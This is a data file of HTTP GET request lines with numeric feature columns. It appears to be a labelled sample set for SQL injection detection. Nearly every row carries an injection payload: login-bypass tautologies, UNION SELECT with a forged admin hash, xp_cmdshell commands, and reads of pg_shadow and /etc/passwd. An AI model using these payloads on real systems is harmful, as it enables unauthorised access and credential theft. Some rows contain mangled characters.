20,1,200,7338,7,2,6,1,1,GET ?id='*' HTTP/1.1
38,1,200,1165,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,2717,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,3485,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,4220,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
37,1,200,4066,7,9,11,2,1,GET ?id=admin') or '1'='1'/* HTTP/1.1
37,1,200,6074,7,9,11,2,1,GET ?id=admin') or '1'='1'/* HTTP/1.1
56,1,200,7565,7,26,10,2,1,GET ?id=' and substring(password/text()_1_1)='7 HTTP/1.1
56,1,200,6225,7,26,10,2,1,GET ?id=' and substring(password/text()_1_1)='7 HTTP/1.1
56,1,200,6999,7,26,10,2,1,GET ?id=' and substring(password/text()_1_1)='7 HTTP/1.1
32,1,200,4118,7,4,12,1,1,GET ?id=') or '1'='1'-- HTTP/1.1
32,1,200,6236,7,4,12,1,1,GET ?id=') or '1'='1'-- HTTP/1.1
38,1,200,5250,7,9,12,2,1,GET login/?id=') or '1'='1'-- HTTP/1.1
38,1,200,1335,7,9,12,2,1,GET login/?id=') or '1'='1'-- HTTP/1.1
30,1,200,7087,7,9,5,2,0,GET login/?id=or 1=1# HTTP/1.1
30,1,200,2112,7,9,5,2,0,GET login/?id=or 1=1# HTTP/1.1
30,1,200,7020,7,9,5,2,0,GET login/?id=or 1=1# HTTP/1.1
33,1,200,3984,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,6366,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,2147,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,7475,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,7287,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,5277,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,4323,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
32,1,200,4191,7,9,4,2,0,GET login/?id= or 0=0 ¡V HTTP/1.1
32,1,200,6896,7,9,4,2,0,GET login/?id= or 0=0 ¡V HTTP/1.1
64,1,200,1183,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,6340,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,2843,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,4269,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
31,1,200,7880,7,9,5,2,0,GET login/?id= or 1=1# HTTP/1.1
31,1,200,3170,7,9,5,2,0,GET login/?id= or 1=1# HTTP/1.1
43,1,200,4906,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,3772,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
28,1,200,5610,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,7571,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,6652,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,6648,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
26,1,200,7854,7,6,5,1,1,GET ?id=' or a=a¡V HTTP/1.1
26,1,200,4744,7,6,5,1,1,GET ?id=' or a=a¡V HTTP/1.1
26,1,200,2987,7,6,5,1,1,GET ?id=' or a=a¡V HTTP/1.1
26,1,200,6478,7,6,5,1,1,GET ?id=' or a=a¡V HTTP/1.1
50,1,200,4361,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,6930,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,4921,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,1937,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
37,1,200,5989,7,9,12,1,1,GET ?id=admin') or '1'='1'-- HTTP/1.1
23,1,200,6243,7,4,4,1,0,GET ?id=or 1=1 HTTP/1.1
23,1,200,7397,7,4,4,1,0,GET ?id=or 1=1 HTTP/1.1
33,1,200,5230,7,9,6,2,1,GET login/?id=' or 0=0 # HTTP/1.1
33,1,200,5555,7,9,6,2,1,GET login/?id=' or 0=0 # HTTP/1.1
33,1,200,3654,7,9,6,2,1,GET login/?id=' or 0=0 # HTTP/1.1
33,1,200,7643,7,9,6,2,1,GET login/?id=' or 0=0 # HTTP/1.1
38,1,200,2934,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,5049,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,5304,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,6815,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
34,1,200,7833,7,12,6,1,1,GET ?id=' or user like '% HTTP/1.1
34,1,200,4441,7,12,6,1,1,GET ?id=' or user like '% HTTP/1.1
34,1,200,3298,7,12,6,1,1,GET ?id=' or user like '% HTTP/1.1
67,1,200,7461,7,36,10,3,1,GET login/?id=admin' and substring(password/text()_1_1)='7 HTTP/1.1
20,1,200,4932,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,7247,7,2,5,2,1,GET ?id='/* HTTP/1.1
44,1,200,6703,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,7866,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,3914,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,3307,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
58,1,200,4356,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,6173,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,4727,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,2698,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,6836,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,6187,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,3500,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,7461,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
20,1,200,6380,7,2,5,1,1,GET ?id=' ' HTTP/1.1
32,1,200,4848,7,11,5,2,1,GET login/?id=' or a=a¡V HTTP/1.1
32,1,200,6844,7,11,5,2,1,GET login/?id=' or a=a¡V HTTP/1.1
32,1,200,7026,7,11,5,2,1,GET login/?id=' or a=a¡V HTTP/1.1
59,1,200,2389,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,1755,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,7232,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,3936,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,6077,21,16,10,1,1,GET ?id=' UNION ALL SELECT system_user()_user();# HTTP/1.1
29,1,200,4994,7,9,4,2,0,GET login/?id=or 1=1 HTTP/1.1
29,1,200,5763,7,9,4,2,0,GET login/?id=or 1=1 HTTP/1.1
29,1,200,2488,7,9,4,2,0,GET login/?id=or 1=1 HTTP/1.1
29,1,200,5969,7,9,4,2,0,GET login/?id=or 1=1 HTTP/1.1
26,1,200,3054,7,7,6,1,1,GET ?id=admin' -- HTTP/1.1
26,1,200,4417,7,7,6,1,1,GET ?id=admin' -- HTTP/1.1
26,1,200,2707,7,7,6,1,1,GET ?id=admin' -- HTTP/1.1
26,1,200,1887,7,7,6,1,1,GET ?id=admin' -- HTTP/1.1
26,1,200,2825,7,7,6,1,1,GET ?id=admin' -- HTTP/1.1
26,1,200,1761,7,4,6,1,1,GET ?id=' or 1=1# HTTP/1.1
26,1,200,6465,7,4,6,1,1,GET ?id=' or 1=1# HTTP/1.1
25,1,200,6192,7,7,5,1,1,GET ?id=admin' # HTTP/1.1
26,1,200,7682,7,7,6,2,1,GET login/?id='-' HTTP/1.1
33,1,200,2913,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,2698,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,6580,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
31,1,200,5785,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,7620,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,3895,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
32,1,200,7200,7,9,8,2,1,GET login/?id=' or ''*' HTTP/1.1
32,1,200,4352,7,9,8,2,1,GET login/?id=' or ''*' HTTP/1.1
32,1,200,7319,7,9,8,2,1,GET login/?id=' or ''*' HTTP/1.1
32,1,200,4359,7,9,8,2,1,GET login/?id=' or ''*' HTTP/1.1
69,1,200,1219,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,4813,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
26,1,200,4617,7,7,5,3,1,GET login/?id='/* HTTP/1.1
26,1,200,6049,7,7,5,3,1,GET login/?id='/* HTTP/1.1
27,1,200,7225,7,4,5,1,1,GET ?id=' or 0=0 ¡V HTTP/1.1
27,1,200,4572,7,4,5,1,1,GET ?id=' or 0=0 ¡V HTTP/1.1
69,1,200,1250,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,7958,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
37,1,200,4637,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,7539,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,5444,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,7997,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
27,1,200,4113,7,4,6,1,2,GET ?id= or 0=0 -- HTTP/1.1
27,1,200,3845,7,4,6,1,2,GET ?id= or 0=0 -- HTTP/1.1
26,1,200,1815,7,7,4,2,1,GET login/?id=' ¡V HTTP/1.1
26,1,200,5961,7,7,4,2,1,GET login/?id=' ¡V HTTP/1.1
26,1,200,1388,7,7,4,2,1,GET login/?id=' ¡V HTTP/1.1
32,1,200,7597,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
58,1,200,3834,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,6402,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,4469,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
26,1,200,2606,7,4,7,1,1,GET ?id=' or '' ' HTTP/1.1
26,1,200,6630,7,4,7,1,1,GET ?id=' or '' ' HTTP/1.1
67,1,200,3704,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,3204,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,6135,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
36,1,200,4817,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,4115,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
45,1,200,3263,7,14,8,2,1,GET login/?id=' or 1=1 limit 1 -- -  HTTP/1.1
34,1,200,4428,7,11,8,2,1,GET login/?id=' or 'a'='a HTTP/1.1
34,1,200,3897,7,11,8,2,1,GET login/?id=' or 'a'='a HTTP/1.1
28,1,200,1387,7,4,7,1,1,GET ?id=' or 1=1 -- HTTP/1.1
32,1,200,1280,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2770,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6025,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
26,1,200,7396,7,4,5,1,1,GET ?id=' or 1=1¡V HTTP/1.1
32,1,200,3593,7,4,12,1,1,GET ?id=') or ('1'='1-- HTTP/1.1
32,1,200,1204,7,4,12,1,1,GET ?id=') or ('1'='1-- HTTP/1.1
32,1,200,4273,7,4,12,1,1,GET ?id=') or ('1'='1-- HTTP/1.1
29,1,200,1745,7,9,6,2,1,GET login/?id='="or' HTTP/1.1
42,1,200,7683,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,2756,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,2646,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
35,1,200,4365,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
43,1,200,2461,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
19,1,200,3789,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,1811,7,2,5,1,1,GET ?id='# HTTP/1.1
36,1,200,7245,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
36,1,200,5193,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
36,1,200,6755,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
36,1,200,3744,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
62,1,200,5539,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,2139,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,3143,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,7334,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,1714,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
27,1,200,5107,7,4,7,1,1,GET ?id=' or 1=1;# HTTP/1.1
23,1,200,5129,7,4,6,1,1,GET ?id='="or' HTTP/1.1
24,1,200,3271,7,4,6,1,1,GET ?id='or'1=1 HTTP/1.1
52,1,200,7447,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,1700,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
30,1,200,5089,7,9,6,2,1,GET login/?id='or'1=1 HTTP/1.1
29,1,200,5785,7,4,9,1,1,GET ?id=') or '1'='1 HTTP/1.1
29,1,200,2290,7,4,9,1,1,GET ?id=') or '1'='1 HTTP/1.1
29,1,200,2088,7,4,9,1,1,GET ?id=') or '1'='1 HTTP/1.1
29,1,200,1257,7,4,9,1,1,GET ?id=') or '1'='1 HTTP/1.1
30,1,200,1889,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
30,1,200,6258,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
30,1,200,5979,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
32,1,200,6645,7,9,8,2,1,GET login/?id=' or ''^' HTTP/1.1
32,1,200,2337,7,9,8,2,1,GET login/?id=' or ''^' HTTP/1.1
41,1,200,3409,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,2351,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,7230,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,3941,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,1982,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
27,1,200,5786,7,4,6,2,1,GET ?id=' or 1=1/* HTTP/1.1
27,1,200,5185,7,4,6,2,1,GET ?id=' or 1=1/* HTTP/1.1
26,1,200,4155,7,4,5,2,2,GET ?id= or 1=1/* HTTP/1.1
26,1,200,1946,7,4,5,2,2,GET ?id= or 1=1/* HTTP/1.1
28,1,200,3053,7,6,8,1,1,GET ?id=' or 'a'='a HTTP/1.1
26,1,200,5337,7,4,6,1,2,GET ?id= or 1=1-- HTTP/1.1
36,1,200,3930,7,9,8,2,1,GET login/?id=) or ('1¡¬='1¡V HTTP/1.1
75,1,200,2238,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
75,1,200,7552,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
75,1,200,7072,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
75,1,200,1304,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
39,1,200,6563,7,9,8,1,1,GET ?id=' or 1=1 limit 1 -- -  HTTP/1.1
39,1,200,4924,7,9,8,1,1,GET ?id=' or 1=1 limit 1 -- -  HTTP/1.1
39,1,200,3570,7,9,8,1,1,GET ?id=' or 1=1 limit 1 -- -  HTTP/1.1
31,1,200,7772,7,9,6,1,1,GET ?id=admin' or 1=1# HTTP/1.1
31,1,200,3913,7,9,6,1,1,GET ?id=admin' or 1=1# HTTP/1.1
43,1,200,6161,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,6964,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,6586,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
27,1,200,5253,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
27,1,200,3047,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
37,1,200,3760,7,9,11,2,1,GET login/?id=') or '1'='1'# HTTP/1.1
39,1,200,6926,7,16,8,2,1,GET login/?id=' and 'one'='one HTTP/1.1
39,1,200,1802,7,16,8,2,1,GET login/?id=' and 'one'='one HTTP/1.1
39,1,200,4442,7,16,8,2,1,GET login/?id=' and 'one'='one HTTP/1.1
32,1,200,6913,7,9,6,2,2,GET login/?id= or 1=1-- HTTP/1.1
32,1,200,6452,7,9,6,2,2,GET login/?id= or 1=1-- HTTP/1.1
37,1,200,7903,7,9,11,2,1,GET login/?id=' or '1'='1'-- HTTP/1.1
38,1,200,6769,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
32,1,200,1253,7,4,11,2,1,GET ?id=') or '1'='1'/* HTTP/1.1
42,1,200,7731,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,6031,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,2300,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
47,1,200,6067,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,4651,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,3322,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,1628,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
31,1,200,3136,7,9,4,2,0,GET login/?id= or 1=1¡V HTTP/1.1
31,1,200,6637,7,9,4,2,0,GET login/?id= or 1=1¡V HTTP/1.1
31,1,200,4664,7,9,4,2,0,GET login/?id= or 1=1¡V HTTP/1.1
31,1,200,1089,7,4,11,1,1,GET ?id=' or '1'='1'-- HTTP/1.1
31,1,200,4815,7,4,11,1,1,GET ?id=' or '1'='1'-- HTTP/1.1
41,1,200,2381,12,9,7,2,1,GET login/?id=' or 1=1 LIMIT 1;# HTTP/1.1
41,1,200,2249,12,9,7,2,1,GET login/?id=' or 1=1 LIMIT 1;# HTTP/1.1
41,1,200,5399,12,9,7,2,1,GET login/?id=' or 1=1 LIMIT 1;# HTTP/1.1
38,1,200,7617,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,3463,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,3028,7,9,13,1,1,GET ?id=admin') or ('1'='1'-- HTTP/1.1
38,1,200,2194,7,9,13,1,1,GET ?id=admin') or ('1'='1'-- HTTP/1.1
38,1,200,7888,7,9,12,2,1,GET login/?id=') or ('1'='1'# HTTP/1.1
34,1,200,1379,7,11,8,1,1,GET ?id=' and 'one'='one¡V HTTP/1.1
34,1,200,2256,7,11,8,1,1,GET ?id=' and 'one'='one¡V HTTP/1.1
46,1,200,3995,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,2637,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
35,1,200,2585,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,4615,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,6171,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,5498,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
28,1,200,3385,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,7014,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
43,1,200,3366,7,16,9,2,1,GET login/?id=admin'or 1=1 or ''=' HTTP/1.1
43,1,200,3638,7,16,9,2,1,GET login/?id=admin'or 1=1 or ''=' HTTP/1.1
43,1,200,3120,7,16,9,2,1,GET login/?id=admin'or 1=1 or ''=' HTTP/1.1
43,1,200,3401,7,16,9,2,1,GET login/?id=admin'or 1=1 or ''=' HTTP/1.1
25,1,200,5782,7,4,4,1,0,GET ?id= or 1=1¡V HTTP/1.1
33,1,200,5733,7,11,8,1,1,GET ?id=' and 'one'='one HTTP/1.1
24,1,200,1605,7,7,4,2,0,GET login/?id== HTTP/1.1
24,1,200,4295,7,7,4,2,0,GET login/?id== HTTP/1.1
32,1,200,4028,7,11,6,2,1,GET login/?id= like '%' HTTP/1.1
32,1,200,1746,7,11,6,2,1,GET login/?id= like '%' HTTP/1.1
91,1,200,1845,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,3608,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
32,1,200,7200,7,5,7,1,1,GET ?id=1¡¬) and '1¡¬='1¡V HTTP/1.1
32,1,200,1051,7,5,7,1,1,GET ?id=1¡¬) and '1¡¬='1¡V HTTP/1.1
35,1,200,7216,7,13,7,2,1,GET login/?id=') or true-- HTTP/1.1
35,1,200,7061,7,13,7,2,1,GET login/?id=') or true-- HTTP/1.1
42,1,200,2954,7,19,6,2,1,GET login/?id=' or userid like '% HTTP/1.1
38,1,200,3897,7,10,7,2,1,GET login/?id=1¡¬) and '1¡¬='1¡V HTTP/1.1
33,1,200,6391,7,4,13,1,1,GET ?id=') or ('1'='1'-- HTTP/1.1
19,1,200,2628,7,2,5,1,0,GET ?id=== HTTP/1.1
19,1,200,1441,7,2,5,1,0,GET ?id=== HTTP/1.1
88,1,200,2175,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
51,1,200,6973,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
25,1,200,5781,7,5,4,1,0,GET ?id= and 1=1 HTTP/1.1
25,1,200,1201,7,5,4,1,0,GET ?id= and 1=1 HTTP/1.1
40,1,200,6370,7,16,8,2,1,GET login/?id=' and 'one'='one¡V HTTP/1.1
40,1,200,6787,7,16,8,2,1,GET login/?id=' and 'one'='one¡V HTTP/1.1
33,1,200,7961,7,10,6,2,1,GET login/?id=' and 1='1 HTTP/1.1
26,1,200,1222,7,5,4,1,0,GET ?id= and 1=1¡V HTTP/1.1
35,1,200,4076,7,9,7,2,1,GET login/?id=) or '1¡¬='1¡V HTTP/1.1
35,1,200,1882,7,9,7,2,1,GET login/?id=) or '1¡¬='1¡V HTTP/1.1
31,1,200,2923,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
31,1,200,2008,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
32,1,200,7120,7,9,8,2,1,GET login/?id=' or ''=' HTTP/1.1
32,1,200,4341,7,9,7,1,1,GET ?id=admin' or 1=1-- HTTP/1.1
32,1,200,1438,7,9,7,1,1,GET ?id=admin' or 1=1-- HTTP/1.1
46,1,200,6706,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
46,1,200,4007,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
25,1,200,7771,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,1277,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,6827,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,1790,7,7,5,2,1,GET login/?id='# HTTP/1.1
32,1,200,4573,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
27,1,200,4851,7,5,6,1,1,GET ?id=' and 1='1 HTTP/1.1
29,1,200,6538,7,4,9,1,1,GET ?id=%' or '0'='0 HTTP/1.1
34,1,200,5192,7,9,7,2,1,GET login/?id=' or '1¡¬='1 HTTP/1.1
57,1,200,6790,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,2295,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
33,1,200,2997,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
32,1,200,4592,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
38,1,200,6827,7,9,12,2,1,GET ?id=admin') or ('1'='1'/* HTTP/1.1
61,1,200,3169,7,31,10,2,1,GET ?id=admin' and substring(password/text()_1_1)='7 HTTP/1.1
40,1,200,2437,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,6016,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
30,1,200,2764,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
41,1,200,2092,7,9,6,2,1,GET login/?id=' or         0=0 # HTTP/1.1
41,1,200,6191,7,9,6,2,1,GET login/?id=' or         0=0 # HTTP/1.1
44,1,200,6548,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
42,1,200,5904,7,11,16,2,1,GET login/?id=')) or (('x'))=(('x HTTP/1.1
35,1,200,5948,7,9,9,2,1,GET login/?id=') or '1'='1 HTTP/1.1
39,1,200,5633,7,15,8,2,1,GET login/?id=' or 'one'='one¡V HTTP/1.1
39,1,200,3159,7,15,8,2,1,GET login/?id=' or 'one'='one¡V HTTP/1.1
56,1,200,5448,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,6471,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
55,1,200,2820,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,5201,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
20,1,200,6731,7,2,6,1,1,GET ?id='-- HTTP/1.1
26,1,200,3594,7,7,6,2,1,GET login/?id='^' HTTP/1.1
40,1,200,1851,7,14,9,2,1,GET login/?id=admin') or '1'='1 HTTP/1.1
41,1,200,1813,7,14,10,2,1,GET login/?id=admin') or ('1'='1 HTTP/1.1
31,1,200,5563,7,12,5,2,1,GET login/?id=admin' # HTTP/1.1
34,1,200,6866,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
